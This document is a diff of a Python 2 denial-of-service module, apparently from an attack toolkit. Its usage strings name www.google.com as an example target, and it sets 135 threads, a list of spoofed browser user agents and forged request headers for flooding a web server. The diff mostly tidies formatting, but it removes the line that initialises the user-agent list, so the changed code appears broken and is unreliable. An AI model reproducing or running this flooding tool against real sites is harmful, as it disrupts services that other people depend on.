@@ -9,20 +9,17 @@
 from queue import Queue
 import time, sys, socket, threading, urllib2, random
 
-usage = ["[?] Dos module usage: set target www.google.com", 
-		 "[?] Dos module usage: dos start"]
+usage = ["[?] Dos module usage: set target www.google.com", "[?] Dos module usage: dos start"]
 
 host = ''
 port = 80
 thr  = 135
 
-uagents = None
+uagent = None
 bots = None
 
 def user_agent():
 	global uagent
-	
-	uagent=[]
 	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
 	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
 	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
@@ -86,7 +83,6 @@ def dos2():
 
 
 # reading headers
-global data
 
 data = """Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-us,en;q=0.5
@@ -143,6 +139,5 @@ def run(url):
 
 		q.join()
 		w.join()
-
-if __name__ == "__main__":		
+if __name__ == "__main__":
 	run(sys.argv[1])
